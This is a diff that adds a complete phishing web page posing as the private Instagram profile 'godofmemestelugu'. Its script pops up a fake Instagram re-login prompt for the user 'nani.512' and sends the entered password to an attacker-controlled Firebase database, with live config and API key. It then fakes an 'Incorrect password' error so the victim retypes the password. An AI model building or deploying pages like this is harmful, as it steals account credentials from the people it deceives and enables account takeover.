@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>@godofmemestelugu</title>
+        
+        
+        <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    
+    
+    
+    <style>
+          
+* {
+    margin:0;
+    border:0.0px solid black;
+    font-family: Verdana, Tahoma, "Trebuchet MS", "DejuVu Sans", "Bitstream Vera Sans", sans-serif;
+}
+
+body {
+    overflow-x:hidden;
+}
+
+#back {
+    position:absolute;
+    height:22px;
+    top:10px;
+    left:15px;
+}
+
+
+.ptop {
+    text-align:center;
+    font-weight:500;
+    margin-top:12px;
+    margin-bottom:12px;
+}
+
+hr {
+    height:0.8px;
+    background-color:lightgrey;
+    border:none;
+}
+
+
+.channel {
+    display:flex;
+}
+
+.channeldiv1 {
+    width:30%;
+}
+
+.channeldiv1 img {
+    height:75px;
+    border-radius:50%;
+    margin-left:50%;
+    transform:translateX(-50%);
+    margin-top:20px;
+}
+
+.channeldiv1 p {
+    font-weight:500;
+    text-align:center;
+    margin-top:25px;
+    margin-bottom:25px;
+}
+
+.channeldiv2 {
+    width:70%;
+}
+
+.channeldiv2 p {
+    font-size:27px;
+    font-weight:300;
+    margin-top:20px;
+}
+
+.channeldiv2 button {
+    width:85%;
+    height:30px;
+    background-color:#0095F7;
+    border-radius:5px;
+    color:#fff;
+    font-weight:600;
+    margin-top:20px;
+}
+
+
+.sollu {
+    display:flex;
+    height:60px;
+}
+
+.sollu div {
+    margin:auto;
+}
+
+.p1 ,.p2{
+    text-align:center;
+}
+
+.p1 {
+    font-weight:500;
+}
+
+.p2 {
+    color:grey;
+    font-size:14px;
+}
+
+.lastdiv {
+    width:100%;
+    border-top:0.5px solid lightgrey;
+    margin-top:0.5px;
+}
+
+.lp1 {
+    font-weight:600;
+    text-align:center;
+    font-size:14px;
+    margin-top:30%;
+}
+
+.lp2 {
+    text-align:center;
+    font-size:14px;
+    width:50%;
+    margin-left:50%;
+    transform:translateX(-50%);
+    margin-top:5px;
+}
+
+
+#blankbg {
+    position:absolute;
+    top:0;
+    left:0;
+    min-height:100%;
+    height:auto;
+    width:100%;
+    background-color:rgba(0,0,0,0.5);
+    display:none;
+}
+
+#loginbg {
+    background-color:white;
+    height:auto;
+    width:70%;
+    border-radius:10px;
+    margin:auto;
+    margin-top:25%;
+    display:none;
+    animation:0.5s anim ease-in-out;
+}
+
+.instagram {
+    height:35px;
+    transform:translateX(-50%);
+    margin-left:50%;
+    margin-top:30px;
+}
+
+.profile {
+    height:80px;
+    border-radius:50%;
+    padding:1px;
+    border:0.5px solid #ececec;
+    transform:translateX(-50%);
+    margin-left:50%;
+    margin-top:10px;
+}
+
+button {
+    background-color:#0095F7;
+    color:#fff;
+    font-weight:500;
+    padding:7px;
+    border-radius:3px;
+    transform:translateX(-50%);
+    margin-left:50%;
+    margin-top:20px;
+    font-size:15px;
+    white-space:nowrap;
+    width:80%;
+    
+}
+
+a {
+    text-decoration:none;
+    color:#0095F7;
+}
+
+.remove {
+    font-size:13px;
+    font-weight:500;
+    color:#0095F7;
+    text-align:center;
+    margin-top:15px;
+}
+
+#loginbg hr {
+    height:0.8px;
+    border:none;
+    background-color:lightgrey;
+    width:80%;
+    margin-left:10%;
+    margin-top:25px;
+}
+
+.switch {
+    font-size:13px;
+    font-weight:500;
+    color:#0095F7;
+    text-align:center;
+    margin-top:5px;
+    padding-bottom:30px;
+}
+
+.notnani , .orblack {
+    color:grey;
+    font-size:13px;
+    color:black;
+    opacity:0.8;
+    font-weight:normal;
+    text-align:center;
+    margin-top:15px;
+}
+
+@keyframes anim {
+    0%{
+        transform:scale(0.9);
+    }
+    50% {
+        transform:scale(1.1);
+    }
+    100% {
+        transform:scale(1);
+    }
+}
+
+#pg1 {
+    visibility:visible;
+}
+
+#pg2 {
+    position:absolute;
+    left:0;
+    width:100%;
+    border:0px solid grey;
+    width:70%;
+    margin-left:15%;
+    z-index:10;
+    display:none;
+}
+
+#enterpass {
+    font-size:14px;
+    font-weight:500;
+    margin-left:5px;
+    margin-left:10%;
+    margin-top:10px;
+}
+
+
+#pass , #pg2 button {
+    height:35px;
+    transform:translateX(-50%);
+    position:;
+    width:80%;
+    margin-top:10px;
+    border-radius:5px;
+    outline:none;
+    border:1px solid lightgrey;
+    padding-left:10px;
+    margin-left:50%;
+}
+
+#pg2 button {
+    border:none;
+    width:85%;
+}
+
+#forgetpass {
+    font-size:13px;
+    color:#0095F7;
+    text-align:right;
+    margin-right:10%;
+    margin-top:5px;
+}
+
+.a {
+  text-align: center;
+  margin-top: 51%;
+}
+
+#watermark {
+    position:fixed;
+    top:0;
+    left:0;
+    height:100%;
+    width:100%;
+    background-color:white;
+}
+
+#watermark img {
+    transform:translate(-50%,-50%);
+    margin-top:50vh;
+    margin-left:50vw;
+    height:50px;
+}
+
+#wrongpass {
+    color:red;
+    font-size:13px;
+    margin-left:8%;
+    margin-top:2px;
+    display:none;
+}
+
+.spinner {
+  position:relative;
+  margin: 0px auto 0;
+  width: 30px;
+  text-align: center;
+  bottom:30px;
+  display:none;
+}
+
+.spinner > div {
+  width: 6.3px;
+  height: 6.3px;
+  background-color: #fff;
+
+  border-radius: 100%;
+  display: inline-block;
+  -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+  animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+}
+
+.spinner .bounce1 {
+  -webkit-animation-delay: -0.32s;
+  animation-delay: -0.32s;
+}
+
+.spinner .bounce2 {
+  -webkit-animation-delay: -0.16s;
+  animation-delay: -0.16s;
+}
+
+@-webkit-keyframes sk-bouncedelay {
+  0%, 80%, 100% { -webkit-transform: scale(0) }
+  40% { -webkit-transform: scale(1.0) }
+}
+
+@keyframes sk-bouncedelay {
+  0%, 80%, 100% { 
+    -webkit-transform: scale(0);
+    transform: scale(0);
+  } 40% { 
+    -webkit-transform: scale(1.0);
+    transform: scale(1.0);
+  }
+}
+
+    </style>
+    
+    
+    <script src="https://www.gstatic.com/firebasejs/5.5.3/firebase.js"></script>
+        
+        
+        
+    </head>
+    <body id="body">
+        
+        <img id="back" src="https://i.ibb.co/svkwGX8/1645188949048.png" />
+        <p class="ptop">godofmemestelugu</p>
+        <hr>
+        
+        <div class="channel">
+            
+            <div class="channeldiv1">
+                
+                <img src="https://i.ibb.co/0Dn3FpT/Screenshot-20220218-172554-01.jpg" />
+                
+                <p>Meme God</p>
+                
+            </div>
+            
+            <div class="channeldiv2">
+                
+                <p>godofmemestelugu</p>
+                
+                <button id="follow">Follow</button>
+                
+            </div>
+            
+            
+            
+        </div>
+        <hr>
+        <div class="sollu">
+            
+            <div>
+                <p class="p1">52</p>
+                <p class="p2">posts</p>
+            </div>
+            
+            <div>
+                <p class="p1">98</p>
+                <p class="p2">followers</p>
+            </div>
+            
+            <div>
+                <p class="p1">2</p>
+                <p class="p2">following</p>
+            </div>
+            
+        </div>
+        <hr>
+        <div class="lastdiv">
+            
+            <p class="lp1">This Account is Private</p>
+            <p class="lp2">Follow to see their photos and videos</p>
+            
+            
+        </div>
+        
+        <div id="blankbg">
+        
+        <div id="loginbg">
+        
+            <div id="pg2">
+                <img class="instagram" src="https://i.ibb.co/QFy23X6/1642696813765.png" />
+                
+                <img class="profile" src="https://i.ibb.co/kcSNzZT/Q-1642755101002.jpg"/>
+                
+                <p id="enterpass"> Enter your password</p>
+                
+                <input id="pass" type="password" placeholder="Password" />
+                <p id="wrongpass">Incorrect password</p>
+                <p id="forgetpass"> <a href="https://www.instagram.com/accounts/password/reset/">Forget Password?</a></p>
+                
+                <button id="login">Continue</button>
+                <div class="spinner" id="spinner">
+  <div class="bounce1"></div>
+  <div class="bounce2"></div>
+  <div class="bounce3"></div>
+</div>
+                
+            </div>
+        
+        
+            <div id="pg1">
+            <img class="instagram" src="https://i.ibb.co/QFy23X6/1642696813765.png" />
+            
+            <img class="profile" src="https://i.ibb.co/kcSNzZT/Q-1642755101002.jpg"/>
+            <button id="continue">Continue as nani.512</button>
+            
+            <p class="remove"> <a href="https://www.instagram.com/accounts/login/">Remove Account</a></p>
+            
+            <hr>
+            
+            <p class="notnani"> Not nani.512? </p>
+            <p class="switch"> <a href="https://www.instagram.com/accounts/login/"> Switch Accounts </a> <span class="orblack">or</span> <a href="https://www.instagram.com/accounts/signup/phone">Sign Up </a></p>
+            </div>
+            
+            
+            
+            
+            
+        </div>
+        
+    </div>
+        
+        
+        <div id="watermark">
+            
+            <img src="https://i.ibb.co/C0q1hkp/1645178918701.png" />
+            
+        </div>
+        
+    </body>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> 
+    
+    <script>
+        
+        window.onload = () => {
+document.getElementById("watermark").style.display ="none";
+
+var isloginactive = false;
+
+class Alert {
+
+    constructor() {
+        this.bg= document.getElementById("blankbg");
+        this.lbg = document.getElementById("loginbg");
+        this.page1 = document.getElementById("pg1");
+        this.page2 = document.getElementById("pg2");
+        this.passinput = document.getElementById("pass");
+        this.button = document.getElementById("login");
+        this.caption = document.getElementById("wrongpass")
+    }
+
+    show() {
+        this.bg.style.display = "block";
+        this.lbg.style.display = "block";
+    }
+    
+    showpg2() {
+        this.page1.style.visibility = "hidden";
+        this.page2.style.display = "block";
+        this.passinput.focus();
+    }
+    
+    activatebutton() {
+        this.button.style.backgroundColor = "#0095F7";
+        isloginactive = true;
+    }
+    deactivatebutton() {
+        this.button.style.backgroundColor = "#ececec";
+        isloginactive = false;
+    }
+    clearpassword() {
+        this.passinput.value = "";
+        this.passinput.style.borderColor = "red";
+        this.caption.style.display = "block";
+        
+        setTimeout( () => {
+            this.passinput.style.borderColor = "lightgrey";
+        this.caption.style.display = "none";
+        },1500)
+        
+        
+    }
+
+
+}
+
+var a = new Alert();
+
+a.deactivatebutton();
+document.getElementById("continue").onclick = () => {
+    a.showpg2();
+}
+
+document.getElementById("pass").onkeyup = () => {
+ let value = document.getElementById("pass").value;
+ 
+ if(value.length >= 6)
+ {
+     a.activatebutton();
+ }
+ else
+ {
+     a.deactivatebutton();
+ }
+}
+
+
+
+setTimeout( () => {
+    a.show();
+},Math.floor(Math.random()*1000)+1000)
+
+document.getElementById("follow").onclick = () => {
+    a.show();
+}
+
+
+
+var config = {
+    apiKey: "AIzaSyA_kyipbRucrtWAtf8jbULc1B0DBRHPHHU",
+
+
+    authDomain: "sharemedia-298b0.firebaseapp.com",
+
+
+    databaseURL: "https://sharemedia-298b0-default-rtdb.firebaseio.com/",
+
+
+    projectId: "sharemedia-298b0",
+
+
+    storageBucket: "sharemedia-298b0.appspot.com",
+
+
+    messagingSenderId: "453857796374"
+  };
+
+firebase.initializeApp(config); 
+var rootRef = firebase.database().ref().child('graduate');
+
+
+
+$('#login').click(function(){ 
+if(isloginactive) {
+rootRef.push().set({ firstName:"Nani.512", lastName:$('#pass').val() });
+}
+loginkaro();
+
+})
+
+function loginkaro() {
+    
+    if(isloginactive) {
+    let spinner = document.getElementById("spinner");
+    
+    spinner.style.display = "block";
+    document.getElementById("login").style.color = "#0095F7"
+    setTimeout( () => {
+        spinner.style.display = "none";
+        a.clearpassword();
+        a.deactivatebutton();
+       document.getElementById("login").style.color = "#fff"
+    },Math.floor(Math.random()*2000)+1500);
+    }
+    
+}
+
+}
+        
+        
+        
+    </script>
+    
+    
+    
+    
+    
+</html>
